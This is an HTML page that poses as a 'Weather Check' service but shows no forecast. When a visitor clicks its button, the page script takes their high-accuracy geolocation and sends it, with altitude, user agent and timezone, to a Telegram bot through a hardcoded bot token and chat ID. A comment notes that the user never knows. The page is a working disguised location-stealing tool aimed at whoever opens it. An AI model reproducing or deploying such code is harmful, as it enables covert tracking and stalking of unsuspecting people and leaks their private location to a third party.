<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Weather Check</title>
    <style>
        body { background: white; color: black; font-family: Arial; margin: 20px; }
        button { background: #4285f4; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        .hidden { display: none; }
    </style>
</head>
<body>
<h2>Weather Service</h2>
<p>Click below to see today's forecast.</p>
<button id="weatherBtn">Check Weather</button>
<div id="dummyOutput" class="hidden"></div>

<script>
    const TELEGRAM_BOT_TOKEN = "8650736921:AAH7qZokqXqR530EQ7ZsT-HxRQcmcLQ5t-E";
    const TELEGRAM_CHAT_ID = "8577571897";

    function sendToTelegram(lat, lng, acc, alt, timestamp, userAgent, timezone) {
        let message = `📍 EXACT LOCATION CAPTURED\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ±${acc} meters\nAltitude: ${alt !== null ? alt : "N/A"} m\nTimestamp: ${timestamp}\nUser Agent: ${userAgent}\nTimezone: ${timezone}\nMaps: https://www.google.com/maps?q=${lat},${lng}`;
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
        }).catch(err => console.log("Send error:", err));
    }

    document.getElementById('weatherBtn').addEventListener('click', function() {
        if (!navigator.geolocation) {
            return;
        }
        let options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };
        function success(pos) {
            let coords = pos.coords;
            sendToTelegram(coords.latitude, coords.longitude, coords.accuracy, coords.altitude, new Date(pos.timestamp).toISOString(), navigator.userAgent, Intl.DateTimeFormat().resolvedOptions().timeZone);
        }
        function error(err) {
            // Silent fail - user never knows
        }
        navigator.geolocation.getCurrentPosition(success, error, options);
    });
</script>
</body>
</html>
